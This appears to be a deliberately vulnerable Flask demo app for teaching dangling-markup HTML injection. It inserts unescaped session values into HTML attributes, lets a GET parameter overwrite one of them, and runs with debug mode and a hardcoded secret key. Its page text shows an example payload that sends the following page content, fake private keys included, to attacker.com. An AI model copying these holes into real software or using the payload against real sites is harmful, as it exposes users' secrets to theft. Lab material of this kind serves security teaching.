from flask import Flask, request, make_response, session, redirect

app = Flask(__name__)
app.secret_key = 'topsecret'

private_key_1_desc = "House key"
private_key_1 = "xjJJSjqpQnIizOi9CHG3ClSxXaCAfjSi"

private_key_2_desc = "Garage key"
private_key_2 = "pvpQogOdIOzvVt6AxNcXa1hREKvUxLad"

private_key_3_desc = "Master key"
private_key_3 = "xZdXDvPdMjUCjD9ZJFCPIoOTFTcMlz6q"

@app.route('/')
def root():
	if not "private_key_1" in session:
		session["private_key_1"] = private_key_1
		session["private_key_1_desc"] = private_key_1_desc
		session["private_key_2"] = private_key_2
		session["private_key_2_desc"] = private_key_2_desc
		session["private_key_3"] = private_key_3
		session["private_key_3_desc"] = private_key_3_desc
	# Simple Menu
	ret = """<html>
<head>
<style>
form {
	margin:0;
	padding:0;
}
input {
	width:250px;
}
</style>
</head>
<body>
	<a href="/reset">Reset session</a><br /><br /><br /><br />

	<p>In older browsers it was possible to inject things like:</p>
	<p style="font-family: Currier New, Arial, Helvetica, sans-serif;">
		House key&quot;&gt;&lt;img src=&quot;attacker.com?html=
	</p>
	<p>
		Which would then take the preceeding content and include it in a request to attacker.com.
		This particular attack does no longer seem to work. 
	</p>
	<br />
	<br />
	Update key description:
	<table>
		<tr>
			<td>Private Key</td>
			<td>Description</td>
			<td> </td>
		<!-- Key set 1 -->
		<tr>
			<td><input type="password" name="private_key_1" value=\""""+session["private_key_1"]+"""\" /></td>
			<form action="/update" method="GET">
			<td><input type="text" name="private_key_1_desc" value=\""""+session["private_key_1_desc"]+"""\" /></td>
			<td><input type="submit" name="Submit" value="update" /></td>
			</form>
		</tr>
		<!-- Key set 2 -->
		<tr>
			<td><input type="password" name="private_key_2" value=\""""+session["private_key_2"]+"""\" /></td>
			<form action="/update" method="POST">
			<td><input type="text" name="private_key_2_desc" value=\""""+session["private_key_2_desc"]+"""\" /></td>
			<td><input type="submit" name="Submit" value="update" /></td>
			</form>
		</tr>
		<!-- Key set 3 -->
		<tr>
			<td><input type="password" name="private_key_3" value=\""""+session["private_key_3"]+"""\" /></td>
			<form action="/update" method="POST">
			<td><input type="text" name="private_key_3_desc" value=\""""+session["private_key_3_desc"]+"""\" /></td>
			<td><input type="submit" name="Submit" value="update" /></td>
			</form>
		</tr>
	</table>
</body>
</html>
	
	"""
	return ret


@app.route('/update', methods=['GET'])
def settings():
	if not request.args.get("private_key_1_desc") == None:
		session["private_key_1_desc"] = request.args.get("private_key_1_desc")

	return redirect("/")

@app.route('/reset')
def reset():
	session.clear()
	return redirect("/")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)

